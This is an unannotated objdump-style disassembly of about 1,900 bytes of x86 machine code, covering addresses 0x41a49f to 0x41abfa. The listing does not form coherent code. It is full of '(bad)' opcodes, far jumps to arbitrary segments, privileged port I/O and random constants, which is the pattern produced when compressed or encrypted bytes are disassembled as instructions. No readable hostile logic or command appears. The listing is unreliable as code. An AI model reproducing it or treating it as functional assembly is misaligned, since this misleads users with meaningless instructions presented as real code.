  41a49f:	sub    DWORD PTR [edi+0x15a2aa08],ecx
  41a4a5:	mov    ch,0xa3
  41a4a7:	cs mov cl,0xb6
  41a4aa:	add    ecx,DWORD PTR [esi+ebx*8+0x7b]
  41a4ae:	jmp    0x6eff:0x2ed9ef69
  41a4b5:	add    cl,ch
  41a4b7:	jmp    FWORD PTR [esi-0x2bd86684]
  41a4bd:	and    dl,BYTE PTR [esi]
  41a4bf:	ret    
  41a4c0:	loop   0x41a4a8
  41a4c2:	outs   dx,BYTE PTR ds:[esi]
  41a4c3:	xchg   ebx,eax
  41a4c4:	mov    eax,ds:0x5085ee77
  41a4c9:	jne    0x41a4b8
  41a4cb:	cld    
  41a4cc:	std    
  41a4cd:	ret    0xbc9a
  41a4d0:	std    
  41a4d1:	mov    al,ds:0xe341270
  41a4d6:	and    ebx,edx
  41a4d8:	bnd jbe 0x41a481
  41a4db:	mov    ah,0x32
  41a4dd:	xor    DWORD PTR [ebx],esi
  41a4df:	test   DWORD PTR [esi],ecx
  41a4e1:	out    0xc7,eax
  41a4e3:	and    eax,0x6e99fc6f
  41a4e8:	xor    esp,esi
  41a4ea:	inc    esp
  41a4eb:	mov    ds:0x9da950db,al
  41a4f0:	test   al,0x76
  41a4f2:	lahf   
  41a4f3:	dec    ebx
  41a4f4:	fnstenv [esi]
  41a4f6:	push   ss
  41a4f7:	js     0x41a55f
  41a4f9:	xor    eax,0x874bf937
  41a4fe:	push   ecx
  41a4ff:	jae    0x41a569
  41a501:	cmp    DWORD PTR [ebx],0x48
  41a504:	mov    dh,0x2
  41a506:	jecxz  0x41a56c
  41a508:	pop    ebp
  41a509:	mov    esp,0x22ea358f
  41a50e:	fidivr DWORD PTR [ebx+0x75]
  41a511:	and    bh,BYTE PTR [edx+edx*1+0x6cfb3e84]
  41a518:	fbstp  TBYTE PTR [edi+0x33]
  41a51b:	daa    
  41a51c:	stos   BYTE PTR es:[edi],al
  41a51d:	jle    0x41a4cc
  41a51f:	out    0x1c,al
  41a521:	adc    ebx,edx
  41a523:	out    dx,eax
  41a524:	jp     0x41a530
  41a526:	xor    eax,0xe8286bb8
  41a52b:	bswap  edx
  41a52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a52e:	fwait
  41a52f:	(bad)  
  41a530:	mov    bl,0xd1
  41a532:	jmp    0xf67c164b
  41a537:	pop    edx
  41a538:	not    DWORD PTR [esi+0xb]
  41a53b:	icebp  
  41a53c:	ret    
  41a53d:	mov    ecx,0xffdf0358
  41a542:	lock test eax,0x389d335d
  41a548:	scas   al,BYTE PTR es:[edi]
  41a549:	cmp    esi,DWORD PTR [ebp+0x7f450556]
  41a54f:	outs   dx,BYTE PTR ds:[esi]
  41a550:	cmp    al,BYTE PTR [eax-0x7f]
  41a553:	xor    eax,0x448d500c
  41a558:	push   cs
  41a559:	(bad)  
  41a55a:	jae    0x41a555
  41a55c:	sahf   
  41a55d:	daa    
  41a55e:	retf   0xbd23
  41a561:	retf   
  41a562:	push   esp
  41a563:	dec    eax
  41a564:	dec    ecx
  41a565:	fld    TBYTE PTR [edi-0x23]
  41a568:	shl    BYTE PTR [ecx-0x48983040],0x53
  41a56f:	fsubr  DWORD PTR [esp+esi*4-0x30]
  41a573:	xor    ebx,0xf644eb04
  41a579:	push   ebx
  41a57a:	in     al,dx
  41a57b:	xor    eax,0xa18c5088
  41a580:	sub    eax,0xde1b152f
  41a585:	loop   0x41a5d6
  41a587:	and    DWORD PTR [ebp-0x1bb62a4f],0xffffffec
  41a58e:	push   edi
  41a58f:	es push ss
  41a591:	loope  0x41a553
  41a593:	cwde   
  41a594:	jecxz  0x41a610
  41a596:	loopne 0x41a5ec
  41a598:	clc    
  41a599:	xchg   BYTE PTR [ebx+0x4679e9b4],al
  41a59f:	mov    DWORD PTR ds:0x54cfd405,eax
  41a5a5:	lea    edx,[ecx-0x2c]
  41a5a8:	dec    esp
  41a5a9:	imul   ebx,edi,0x35
  41a5ac:	pop    edx
  41a5ad:	loopne 0x41a5fa
  41a5af:	cdq    
  41a5b0:	xor    ebp,ecx
  41a5b2:	ins    BYTE PTR es:[edi],dx
  41a5b3:	xchg   edi,eax
  41a5b4:	int    0x22
  41a5b6:	xchg   BYTE PTR [esi],cl
  41a5b8:	fisttp WORD PTR [edi+0x77]
  41a5bb:	jns    0x41a574
  41a5bd:	(bad)  
  41a5be:	in     al,dx
  41a5bf:	xchg   edi,eax
  41a5c0:	xchg   DWORD PTR [edx+0x161be5ba],ebx
  41a5c6:	adc    eax,0x72e9a95c
  41a5cb:	ficom  WORD PTR [eax]
  41a5cd:	stos   BYTE PTR es:[edi],al
  41a5ce:	nop
  41a5cf:	daa    
  41a5d0:	xchg   esp,eax
  41a5d1:	mov    ds:0xa51e60c9,al
  41a5d6:	cs loop 0x41a5b2
  41a5d9:	addr16 pop ecx
  41a5db:	inc    esp
  41a5dc:	idiv   BYTE PTR [esi]
  41a5de:	mov    ebp,0x653ae015
  41a5e3:	pop    edx
  41a5e4:	jge    0x41a625
  41a5e6:	cmp    al,0x8b
  41a5e8:	ins    DWORD PTR es:[edi],dx
  41a5e9:	or     ecx,DWORD PTR [eax+0x583e6ea0]
  41a5ef:	dec    esi
  41a5f0:	aad    0xd6
  41a5f2:	nop
  41a5f3:	sar    ecx,1
  41a5f5:	jno    0x41a58e
  41a5f7:	cmp    bl,BYTE PTR [eax]
  41a5f9:	std    
  41a5fa:	add    edx,DWORD PTR [edx-0x4b]
  41a5fd:	stos   BYTE PTR es:[edi],al
  41a5fe:	pop    ds
  41a5ff:	test   al,0x84
  41a601:	outs   dx,DWORD PTR ds:[esi]
  41a602:	cmp    al,0x5b
  41a604:	(bad)  
  41a605:	sbb    eax,0xe4c9f24e
  41a60a:	lock push esi
  41a60c:	ret    0x2a30
  41a60f:	sbb    al,0x98
  41a611:	jecxz  0x41a66f
  41a613:	mov    WORD PTR es:[ebx+0x55],gs
  41a617:	jmp    0xa442:0x91a3f0e5
  41a61e:	jb     0x41a617
  41a620:	call   0x420fc3c4
  41a625:	(bad)  
  41a626:	nop
  41a627:	mov    edx,0x28da3361
  41a62c:	jnp    0x41a6aa
  41a62e:	icebp  
  41a62f:	aas    
  41a630:	jecxz  0x41a624
  41a632:	(bad)  
  41a634:	jecxz  0x41a644
  41a636:	xor    al,BYTE PTR [eax+ebx*2+0x60]
  41a63a:	clc    
  41a63b:	inc    esi
  41a63c:	push   es
  41a63d:	(bad)  
  41a63e:	fnstenv [ecx+0x7f]
  41a641:	push   ebp
  41a642:	or     DWORD PTR [ecx+ecx*8-0x12],ecx
  41a646:	std    
  41a647:	je     0x41a68b
  41a649:	test   BYTE PTR [esi],0x76
  41a64c:	cmp    ch,dh
  41a64e:	arpl   WORD PTR [eax+0x30dd943],si
  41a654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a655:	push   eax
  41a656:	mov    dh,0x2
  41a658:	popf   
  41a659:	loop   0x41a6b9
  41a65b:	retf   0x8019
  41a65e:	ds jae 0x41a5e7
  41a661:	outs   dx,DWORD PTR ds:[esi]
  41a662:	fcomp  QWORD PTR [edi]
  41a664:	adc    eax,0xde1793bf
  41a669:	sub    esi,eax
  41a66b:	loope  0x41a6ca
  41a66d:	sbb    al,0x12
  41a66f:	popf   
  41a670:	push   ebx
  41a671:	adc    BYTE PTR [edx],dl
  41a673:	cmp    DWORD PTR [esi+eiz*4],0xffffffa8
  41a677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a679:	sub    eax,DWORD PTR [ebx+0x1c]
  41a67c:	pop    ecx
  41a67d:	call   0x5fc3:0x947e7085
  41a684:	xchg   esi,eax
  41a685:	push   cs
  41a686:	xor    DWORD PTR [ebx+0x360b0740],edx
  41a68c:	xchg   esp,eax
  41a68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a68e:	xchg   ebx,eax
  41a68f:	xchg   esp,eax
  41a690:	arpl   si,sp
  41a692:	outs   dx,DWORD PTR ds:[esi]
  41a693:	out    dx,eax
  41a694:	cld    
  41a695:	fild   QWORD PTR [edi]
  41a697:	(bad)
  41a69b:	cli    
  41a69c:	add    esp,DWORD PTR [ebx+0x17]
  41a69f:	ucomiss xmm0,DWORD PTR [ebp+edx*2+0x3236d93d]
  41a6a7:	leave  
  41a6a8:	pop    esp
  41a6a9:	pop    eax
  41a6aa:	sub    ch,cl
  41a6ac:	jle    0x41a6f6
  41a6ae:	out    0xcb,al
  41a6b0:	add    BYTE PTR [edi-0x62],ah
  41a6b3:	jne    0x41a6f5
  41a6b5:	int    0xf7
  41a6b7:	mov    WORD PTR [edi-0x2],ds
  41a6ba:	and    eax,0xe26a7c21
  41a6bf:	sbb    eax,0x2d6cd853
  41a6c4:	mov    dl,0x9
  41a6c6:	add    dl,BYTE PTR [ebp-0x2a119fe9]
  41a6cc:	(bad)  [esi-0x73]
  41a6cf:	pop    ax
  41a6d1:	sub    eax,0x18c0501f
  41a6d6:	aas    
  41a6d7:	xchg   BYTE PTR [ebx+0x48],ah
  41a6da:	inc    edi
  41a6db:	or     al,0x3c
  41a6dd:	jae    0x41a71f
  41a6df:	test   eax,0xc42d2585
  41a6e4:	dec    ebx
  41a6e5:	mov    cs,eax
  41a6e7:	or     al,bh
  41a6e9:	xchg   esi,eax
  41a6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6eb:	outs   dx,DWORD PTR ds:[esi]
  41a6ec:	jo     0x41a675
  41a6ee:	clc    
  41a6ef:	std    
  41a6f0:	pop    ebp
  41a6f1:	push   cs
  41a6f2:	cs xor al,0xe0
  41a6f5:	mov    ah,0x2d
  41a6f7:	les    ebp,FWORD PTR [ecx+0x3d]
  41a6fa:	pop    ecx
  41a6fb:	mov    cl,0x9a
  41a6fd:	xor    esi,ecx
  41a6ff:	add    esi,eax
  41a701:	pop    edx
  41a702:	shr    edi,cl
  41a704:	xchg   ebx,eax
  41a705:	sub    BYTE PTR [edi],ch
  41a707:	popa   
  41a708:	adc    al,0x6d
  41a70a:	inc    eax
  41a70b:	test   DWORD PTR [eax+0x6010b714],esp
  41a711:	retf   0x5027
  41a714:	lods   eax,DWORD PTR ds:[esi]
  41a715:	loopne 0x41a723
  41a717:	ins    BYTE PTR es:[edi],dx
  41a718:	xor    edi,DWORD PTR [ecx+0x4770de04]
  41a71e:	mov    ch,0x21
  41a720:	stc    
  41a721:	aam    0xe
  41a723:	dec    ecx
  41a724:	fcmovb st,st(4)
  41a726:	in     eax,dx
  41a727:	pop    ecx
  41a728:	(bad)  
  41a729:	jb     0x41a780
  41a72b:	pop    ecx
  41a72d:	push   ecx
  41a72e:	repnz stos DWORD PTR es:[edi],eax
  41a730:	mov    ds:0xd8d972a9,al
  41a735:	call   0x45c8d15f
  41a73a:	add    ah,BYTE PTR [esi-0x79167c78]
  41a740:	aad    0x83
  41a742:	popf   
  41a743:	mov    bh,al
  41a745:	inc    edi
  41a746:	int    0xeb
  41a748:	sub    dh,BYTE PTR [ebx+edi*8-0x7376d9b5]
  41a74f:	jne    0x41a7b2
  41a751:	jl     0x41a723
  41a753:	add    esp,DWORD PTR [esi]
  41a755:	ins    BYTE PTR es:[edi],dx
  41a756:	shr    DWORD PTR [ecx-0x588f055e],0xae
  41a75d:	cmp    eax,DWORD PTR [ebx-0x6696ae6b]
  41a763:	add    al,0xb4
  41a765:	or     eax,0xe0351a6e
  41a76a:	ret    0xaec7
  41a76d:	or     al,0x8a
  41a76f:	(bad)  
  41a770:	(bad)  
  41a771:	adc    eax,0xdb5bd455
  41a776:	jnp    0x41a773
  41a778:	mov    bh,0x27
  41a77a:	lock repnz inc esi
  41a77d:	psubsb mm6,QWORD PTR [edx-0x40]
  41a781:	pop    ds
  41a782:	push   ebp
  41a783:	push   ebx
  41a784:	mov    al,ds:0x5602039
  41a789:	lds    ebp,FWORD PTR [edx-0x76]
  41a78c:	call   0x7cf2c054
  41a791:	test   ecx,0x5d828918
  41a797:	push   ss
  41a798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a799:	fild   QWORD PTR [edx]
  41a79b:	jle    0x41a79b
  41a79d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79e:	or     BYTE PTR [edx+0x101a57df],dh
  41a7a4:	dec    edx
  41a7a5:	test   BYTE PTR [esi+eiz*8+0x76d3d21f],ch
  41a7ac:	ja     0x41a764
  41a7ae:	lea    ebx,[edx+0x745823a5]
  41a7b4:	(bad)  
  41a7b6:	ins    DWORD PTR es:[edi],dx
  41a7b7:	xchg   esi,eax
  41a7b8:	mov    ah,0xa4
  41a7ba:	mov    ds:0x8c2d081,eax
  41a7bf:	and    BYTE PTR ds:0x4ae3e2db,bl
  41a7c5:	bound  eax,QWORD PTR [ebx]
  41a7c7:	popa   
  41a7c8:	fist   WORD PTR [ebx-0x5a]
  41a7cb:	lock push esi
  41a7cd:	dec    ebp
  41a7ce:	add    edx,esp
  41a7d0:	add    al,0xa5
  41a7d2:	(bad)  
  41a7d3:	mov    ds:0xc3dd7463,al
  41a7d8:	push   ss
  41a7d9:	inc    esp
  41a7da:	and    al,0x6e
  41a7dc:	sbb    al,0xf1
  41a7de:	lock sbb dl,BYTE PTR [edi+0x51c4d217]
  41a7e5:	cmp    al,BYTE PTR [eax+0x70]
  41a7e8:	cmp    dh,BYTE PTR [ecx]
  41a7ea:	jne    0x41a7a0
  41a7ec:	jg     0x41a7ba
  41a7ee:	in     al,dx
  41a7ef:	aam    0x48
  41a7f1:	push   ecx
  41a7f2:	sbb    eax,0xc36a35a6
  41a7f7:	mov    ds:0x6eb36c37,eax
  41a7fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7fd:	sahf   
  41a7fe:	loopne 0x41a875
  41a800:	mov    ch,0x4f
  41a802:	push   cs
  41a803:	mov    eax,ds:0x27c0521b
  41a808:	imul   BYTE PTR [ebx+0xef63954]
  41a80e:	sub    al,0xfe
  41a810:	gs or  eax,0x40a85f38
  41a816:	xchg   ecx,eax
  41a817:	mov    eax,0x7d1bd1d5
  41a81c:	mov    ds:0x9f39733b,al
  41a821:	mov    bh,0xb3
  41a823:	arpl   WORD PTR [edx+0x5f81f183],cx
  41a829:	mov    ah,0xfd
  41a82b:	jg     0x41a7ff
  41a82d:	repz mov eax,0xb6d30de7
  41a833:	mov    ebx,0x91b12ccd
  41a839:	pop    edx
  41a83a:	scas   al,BYTE PTR es:[edi]
  41a83b:	and    al,0xf7
  41a83d:	sbb    eax,DWORD PTR [eax]
  41a83f:	adc    al,0xa4
  41a841:	ds xchg ecx,eax
  41a843:	(bad)  
  41a844:	icebp  
  41a845:	fstp   QWORD PTR [ecx]
  41a847:	fild   QWORD PTR [edi+0x12]
  41a84a:	sbb    eax,0x8815d389
  41a84f:	addr16 inc esi
  41a851:	inc    ebx
  41a852:	sub    edx,eax
  41a854:	pop    esp
  41a855:	pop    ecx
  41a856:	mul    BYTE PTR [esi-0x49]
  41a859:	jae    0x41a811
  41a85b:	or     ebp,ebp
  41a85d:	(bad)  
  41a85e:	sbb    al,0xcb
  41a860:	rcl    DWORD PTR [edi],0xf1
  41a863:	ja     0x41a815
  41a865:	scas   al,BYTE PTR es:[edi]
  41a866:	(bad)  [ebx-0x39]
  41a869:	movzx  ebp,BYTE PTR [eax]
  41a86c:	xchg   DWORD PTR [edi+0x29],ecx
  41a86f:	xchg   esp,eax
  41a870:	js     0x41a7fe
  41a872:	ret    
  41a873:	int    0xf6
  41a875:	inc    edi
  41a876:	and    eax,ecx
  41a878:	sub    al,0x21
  41a87a:	enter  0xfa6d,0x6a
  41a87e:	pop    ecx
  41a87f:	mov    ebx,0x8144a3e9
  41a884:	jbe    0x41a895
  41a886:	cmp    eax,0x934c7d0f
  41a88b:	cmp    BYTE PTR [ecx],ah
  41a88d:	inc    edx
  41a88e:	js     0x41a8a9
  41a890:	cmp    ax,0x3617
  41a894:	leave  
  41a895:	into   
  41a896:	call   0x9f95:0x841df46f
  41a89d:	mov    ecx,0xb9fedd9f
  41a8a2:	and    BYTE PTR [ebx+ebp*8-0x2d9d6e12],bh
  41a8a9:	data16 xchg BYTE PTR [esi-0x1dc85642],bh
  41a8b0:	ss xchg ebx,eax
  41a8b2:	daa    
  41a8b3:	xor    edi,0x6d
  41a8b6:	pop    esp
  41a8b7:	cmc    
  41a8b8:	es cmp eax,0x3da0f7af
  41a8be:	or     esp,DWORD PTR [eax+eiz*8-0x680ff0c6]
  41a8c5:	adc    al,BYTE PTR [edx+ecx*1+0x4b]
  41a8c9:	stc    
  41a8ca:	push   esp
  41a8cb:	xchg   ebp,eax
  41a8cc:	loope  0x41a869
  41a8ce:	loopne 0x41a860
  41a8d0:	sub    al,0x35
  41a8d2:	adc    DWORD PTR [esi],edx
  41a8d4:	jo     0x41a945
  41a8d6:	aam    0xe2
  41a8d8:	popa   
  41a8d9:	mov    ecx,0x86a73287
  41a8de:	ret    0x6228
  41a8e1:	pmaxsw mm2,QWORD PTR [edi]
  41a8e4:	sub    DWORD PTR [ecx],ebx
  41a8e6:	addr16 pop eax
  41a8e8:	in     eax,dx
  41a8e9:	xor    BYTE PTR [edx+0x553355c6],bh
  41a8ef:	sub    bh,ch
  41a8f1:	test   ch,0x27
  41a8f4:	dec    ecx
  41a8f5:	cdq    
  41a8f6:	push   ds
  41a8f7:	cld    
  41a8f8:	ins    DWORD PTR es:[edi],dx
  41a8f9:	mov    ebx,0x418add02
  41a8fe:	mov    eax,0xfc96ee42
  41a903:	int3   
  41a904:	mov    esi,0xbed82488
  41a909:	sti    
  41a90a:	inc    esi
  41a90b:	xchg   DWORD PTR [edx],esi
  41a90d:	fiadd  WORD PTR [ebp-0x67daaba4]
  41a913:	out    dx,al
  41a914:	jae    0x41a8b1
  41a916:	pop    ecx
  41a917:	repnz push edx
  41a919:	mov    eax,0x39d39859
  41a91e:	ss sahf 
  41a920:	aad    0x52
  41a922:	scas   al,BYTE PTR es:[edi]
  41a923:	ins    DWORD PTR es:[edi],dx
  41a924:	mov    edx,edi
  41a926:	sbb    ebp,DWORD PTR fs:[eax+0x230d32a4]
  41a92d:	xor    al,0x62
  41a92f:	sbb    BYTE PTR [edx-0x29],bh
  41a932:	into   
  41a933:	enter  0x45ce,0x11
  41a937:	sbb    ch,BYTE PTR [ebp-0x2d]
  41a93a:	call   DWORD PTR [edi-0x6e]
  41a93d:	add    DWORD PTR [ebx],esp
  41a93f:	xor    al,0x13
  41a941:	cld    
  41a942:	push   ecx
  41a943:	pop    eax
  41a944:	lods   al,BYTE PTR ds:[esi]
  41a945:	or     eax,0x9fa03a4
  41a94a:	mov    ch,BYTE PTR [ebx]
  41a94c:	fsubp  st(0),st
  41a94e:	adc    esi,DWORD PTR [ecx]
  41a950:	popa   
  41a951:	mov    al,ds:0x3b0a7943
  41a956:	sbb    edi,ebp
  41a958:	push   esp
  41a959:	inc    esi
  41a95a:	and    dh,BYTE PTR [ebx+0x5]
  41a95d:	enter  0x95a6,0x8b
  41a961:	mov    bl,0x69
  41a963:	rcr    BYTE PTR ds:0x28c2b0fa,1
  41a969:	mov    dl,0xde
  41a96b:	repz push cs
  41a96d:	js     0x41a8ef
  41a96f:	add    al,0x30
  41a971:	ins    BYTE PTR es:[edi],dx
  41a972:	ret    0xbc54
  41a975:	pop    ss
  41a976:	add    eax,0x34291841
  41a97b:	lahf   
  41a97c:	aam    0x83
  41a97e:	call   0x88a4ec75
  41a983:	or     edi,DWORD PTR [esi+edi*8-0x66]
  41a987:	push   eax
  41a988:	repnz and al,0xe2
  41a98b:	popa   
  41a98c:	cmc    
  41a98d:	js     0x41a9b1
  41a98f:	push   edx
  41a990:	mov    edi,0xe54266e4
  41a995:	cld    
  41a996:	ja     0x41aa0d
  41a998:	das    
  41a999:	loop   0x41a92b
  41a99b:	pop    esi
  41a99c:	iret   
  41a99d:	clc    
  41a99e:	jg     0x41a9bc
  41a9a0:	ror    dl,1
  41a9a2:	xchg   edx,esp
  41a9a4:	add    eax,DWORD PTR [ebx-0x36ea3135]
  41a9aa:	and    edi,DWORD PTR [esi]
  41a9ac:	rol    ah,1
  41a9ae:	mov    eax,ds:0x79332dfb
  41a9b3:	mov    cl,0xe0
  41a9b5:	(bad)  
  41a9b6:	cli    
  41a9b7:	xor    esi,esi
  41a9b9:	cmp    BYTE PTR [ecx-0x34],cl
  41a9bc:	rcl    DWORD PTR [ecx],1
  41a9be:	mov    WORD PTR [eax+0x7c532a0c],0xb35a
  41a9c7:	fild   QWORD PTR [ebx]
  41a9c9:	xchg   edi,eax
  41a9ca:	and    cl,ch
  41a9cc:	xor    eax,0x52ae4122
  41a9d1:	pop    ebx
  41a9d2:	ss adc cl,bh
  41a9d5:	pop    es
  41a9d6:	push   ss
  41a9d7:	ret    0x6680
  41a9da:	sar    BYTE PTR [eax+ecx*8+0x5a],1
  41a9de:	jno    0x41a981
  41a9e0:	mov    eax,DWORD PTR [edx+0x42b71410]
  41a9e6:	outs   dx,DWORD PTR ds:[esi]
  41a9e7:	mov    bl,0x5d
  41a9e9:	mov    bh,0x82
  41a9eb:	test   DWORD PTR [ebx],edx
  41a9ed:	sbb    al,0xd
  41a9ef:	aad    0xb3
  41a9f1:	iret   
  41a9f2:	adc    BYTE PTR [edx+0x4ea46feb],ch
  41a9f8:	in     eax,dx
  41a9f9:	lds    esp,FWORD PTR [esi-0x3e]
  41a9fc:	add    BYTE PTR [ebx],bh
  41a9fe:	fist   WORD PTR ds:0x9c694cee
  41aa04:	ins    BYTE PTR es:[di],dx
  41aa06:	dec    esp
  41aa07:	xchg   edx,eax
  41aa08:	(bad)
  41aa0b:	push   esp
  41aa0c:	jg     0x41a9bb
  41aa0e:	sbb    BYTE PTR [eax],bl
  41aa10:	std    
  41aa11:	add    ebx,ecx
  41aa13:	add    eax,esi
  41aa15:	dec    esi
  41aa16:	inc    ecx
  41aa17:	out    0x1c,eax
  41aa19:	iret   
  41aa1a:	pop    ss
  41aa1b:	mov    ebx,0xc5b678ab
  41aa20:	mov    DWORD PTR [ecx-0x54],0xfcd89bc3
  41aa27:	in     eax,0x4c
  41aa29:	and    eax,ebp
  41aa2b:	inc    edi
  41aa2c:	add    bl,ch
  41aa2e:	jp     0x41aa7c
  41aa30:	adc    al,0x7f
  41aa32:	jmp    0x4649:0x5db9c57
  41aa39:	in     eax,0x99
  41aa3b:	arpl   WORD PTR [ecx-0x60a65ca5],bp
  41aa41:	lahf   
  41aa42:	(bad)  
  41aa43:	(bad)  
  41aa44:	aad    0xa5
  41aa46:	sub    al,ah
  41aa48:	cmp    al,0x54
  41aa4a:	sbb    al,0x7a
  41aa4c:	inc    edi
  41aa4d:	or     BYTE PTR [eax],bl
  41aa4f:	cmp    DWORD PTR [edx],ecx
  41aa51:	jnp    0x41aa34
  41aa53:	pmullw mm6,QWORD PTR [edi-0x450d0886]
  41aa5a:	js     0x41aaad
  41aa5c:	sub    al,BYTE PTR [ecx-0x371841cb]
  41aa62:	push   edi
  41aa63:	(bad)  
  41aa64:	sub    cl,BYTE PTR [eax]
  41aa66:	icebp  
  41aa67:	inc    edi
  41aa68:	je     0x41aaa6
  41aa6a:	sti    
  41aa6b:	loope  0x41aab2
  41aa6d:	int    0xba
  41aa6f:	outs   dx,BYTE PTR ds:[esi]
  41aa70:	cs gs ins DWORD PTR es:[edi],dx
  41aa73:	mov    esi,0x57913a38
  41aa78:	pop    eax
  41aa79:	and    cl,cl
  41aa7b:	(bad)  
  41aa7c:	jp     0x41aa0a
  41aa7e:	jne    0x41aa7c
  41aa80:	and    eax,DWORD PTR [esi]
  41aa82:	sbb    eax,0x22b6bd54
  41aa87:	sbb    eax,DWORD PTR [ebx+eax*2]
  41aa8a:	jmp    0xa1a6:0xdc243fd0
  41aa91:	push   cs
  41aa92:	bound  ebp,QWORD PTR [edi+0x4f]
  41aa95:	test   ecx,ecx
  41aa97:	retf   
  41aa98:	mov    bh,0x1b
  41aa9a:	sbb    dh,BYTE PTR [ecx]
  41aa9c:	jp     0x41aadc
  41aa9e:	call   0x1ca3:0x1618aded
  41aaa5:	hlt    
  41aaa6:	mov    eax,0xa7dd996a
  41aaab:	mov    DWORD PTR [eax-0x72],esi
  41aaae:	mov    bh,0x28
  41aab0:	add    eax,0xcd3c0dbb
  41aab5:	les    esp,FWORD PTR [edx+0x605d1571]
  41aabb:	mov    dl,0xd2
  41aabd:	adc    ah,al
  41aabf:	cs dec edi
  41aac1:	mov    gs,WORD PTR [edx]
  41aac3:	xor    esp,ebp
  41aac5:	add    BYTE PTR ds:0xd32d3cd5,0xa6
  41aacc:	pop    ss
  41aacd:	fild   QWORD PTR [ebx+edx*8]
  41aad0:	add    BYTE PTR [ebx+eax*8+0xe],0x19
  41aad5:	sub    al,0x6a
  41aad7:	add    ebp,ebp
  41aad9:	inc    esi
  41aada:	pop    ebx
  41aadb:	inc    edx
  41aadc:	mov    al,0xf1
  41aade:	and    edi,edi
  41aae0:	je     0x41aad8
  41aae2:	aas    
  41aae3:	retf   
  41aae4:	lods   eax,DWORD PTR ds:[esi]
  41aae5:	inc    edi
  41aae6:	inc    ebx
  41aae8:	inc    ecx
  41aae9:	xchg   edx,eax
  41aaea:	mov    esi,0xe3032964
  41aaef:	jecxz  0x41ab44
  41aaf1:	mov    esp,0x47b87928
  41aaf6:	and    BYTE PTR [ecx-0x55],0x99
  41aafa:	mov    bl,0x2d
  41aafc:	or     DWORD PTR ds:0xf0be63bd,ecx
  41ab02:	(bad)  
  41ab03:	sbb    eax,ecx
  41ab05:	aam    0x21
  41ab07:	and    eax,0x13d59e5e
  41ab0c:	or     DWORD PTR [edx+0x2144a9d9],eax
  41ab12:	in     al,dx
  41ab13:	(bad)  
  41ab14:	dec    edi
  41ab15:	sti    
  41ab16:	mov    edx,0x3f67a989
  41ab1b:	push   ss
  41ab1c:	iret   
  41ab1d:	dec    ebp
  41ab1e:	daa    
  41ab1f:	bound  eax,QWORD PTR [eax]
  41ab21:	sub    al,0x12
  41ab23:	in     eax,0xbe
  41ab25:	mov    dh,0xf3
  41ab27:	jne    0x41aaaa
  41ab29:	les    ebp,FWORD PTR [ebx-0x53108a40]
  41ab2f:	mov    ah,0x39
  41ab31:	into   
  41ab32:	fisub  WORD PTR [esi-0x55]
  41ab35:	enter  0x671c,0x6b
  41ab39:	fwait
  41ab3a:	push   esi
  41ab3b:	fisubr DWORD PTR [ecx]
  41ab3d:	mov    dh,0x53
  41ab3f:	shr    BYTE PTR [ecx+0x8],cl
  41ab42:	mov    dl,BYTE PTR [eax]
  41ab44:	or     al,0x77
  41ab46:	dec    edi
  41ab47:	retf   0xd9f8
  41ab4a:	jnp    0x41ab7f
  41ab4c:	out    dx,eax
  41ab4d:	mov    dl,0x82
  41ab4f:	jecxz  0x41ab98
  41ab51:	(bad)  
  41ab52:	jmp    0x4641:0xe0a79f21
  41ab59:	enter  0x1e49,0xd
  41ab5d:	inc    esp
  41ab5e:	sub    al,0x61
  41ab60:	and    DWORD PTR [edi+0x3e],edx
  41ab63:	cmp    ebx,DWORD PTR [esi+esi*4+0x21]
  41ab67:	sbb    al,0xd6
  41ab69:	in     al,dx
  41ab6a:	retf   0x3e3a
  41ab6d:	cmp    esi,ecx
  41ab6f:	retf   
  41ab70:	xchg   BYTE PTR [ebx+0x56],al
  41ab73:	inc    ecx
  41ab74:	jb     0x41ab84
  41ab76:	mov    edx,0x64eff1e8
  41ab7b:	nop
  41ab7c:	sbb    al,0x7b
  41ab7e:	test   eax,edi
  41ab80:	mov    eax,ds:0xd53d80a9
  41ab85:	dec    edx
  41ab86:	pop    esp
  41ab87:	daa    
  41ab88:	push   cs
  41ab89:	sbb    BYTE PTR [ebp+0x40c4c533],0x66
  41ab90:	mov    dl,0xcb
  41ab92:	sbb    al,0xc4
  41ab94:	inc    ebx
  41ab95:	outs   dx,BYTE PTR ds:[esi]
  41ab96:	outs   dx,DWORD PTR ds:[esi]
  41ab97:	mov    dl,0x55
  41ab99:	push   ds
  41ab9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab9b:	add    BYTE PTR [edx-0x483e87ae],0xe3
  41aba2:	sbb    DWORD PTR [esi+0x51eeb184],edx
  41aba8:	pop    edx
  41aba9:	pop    esp
  41abaa:	pop    esp
  41abab:	ficomp WORD PTR ds:0xc8d09c0b
  41abb1:	dec    ebx
  41abb2:	aam    0xa2
  41abb4:	sub    BYTE PTR ds:0xb917afa,dl
  41abba:	jle    0x41ac27
  41abbc:	jno    0x41ac00
  41abbe:	and    eax,0xe2b27f4f
  41abc3:	std    
  41abc4:	daa    
  41abc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abc6:	push   0x8b8399e1
  41abcb:	dec    esi
  41abcc:	add    BYTE PTR [edi+0x74],bh
  41abcf:	repnz pop edi
  41abd1:	pop    esi
  41abd2:	xchg   ebx,eax
  41abd3:	cmp    BYTE PTR [edi-0x1e],dl
  41abd6:	jge    0x41abd7
  41abd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd9:	xor    al,0x7c
  41abdb:	lahf   
  41abdc:	or     al,0x8f
  41abde:	pop    es
  41abdf:	mov    ecx,0x468665fc
  41abe4:	xchg   DWORD PTR [esi+0xa],edx
  41abe7:	sti    
  41abe8:	aad    0xfb
  41abea:	in     eax,0x30
  41abec:	ffreep st(0)
  41abee:	fsubr  DWORD PTR [eax+ecx*2]
  41abf1:	push   es
  41abf2:	pop    es
  41abf3:	dec    ecx
  41abf4:	sub    BYTE PTR [edx],bh
  41abf6:	jl     0x41ac56
  41abf8:	(bad)  
  41abfa:	aaa    
